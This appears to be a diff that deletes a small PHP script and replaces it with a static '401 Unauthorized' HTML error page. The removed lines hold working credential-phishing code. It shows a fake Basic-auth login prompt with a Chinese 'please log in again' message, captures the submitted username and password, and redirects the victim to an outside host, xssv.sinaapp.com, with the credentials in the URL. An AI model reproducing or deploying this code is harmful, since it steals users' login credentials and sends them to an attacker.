@@ -1,18 +1,9 @@
-<?
-
-if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" )
-{
- header('WWW-Authenticate: Basic realm="对不起，请重新登录："');
- header('HTTP/1.0 401 Unauthorized');
-
-}
-else{
-$user = $_SERVER['PHP_AUTH_USER'];
-$pass = $_SERVER['PHP_AUTH_PW'];
-$fish = "username:".$user."  password:".$pass;
-
-header("location:http://xssv.sinaapp.com/x.php?c=$fish");
-}
-
-
-?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+ "http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML>
+  <HEAD>
+    <TITLE>Error</TITLE>
+    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">
+  </HEAD>
+  <BODY><H1>401 Unauthorized.</H1></BODY>
+</HTML>
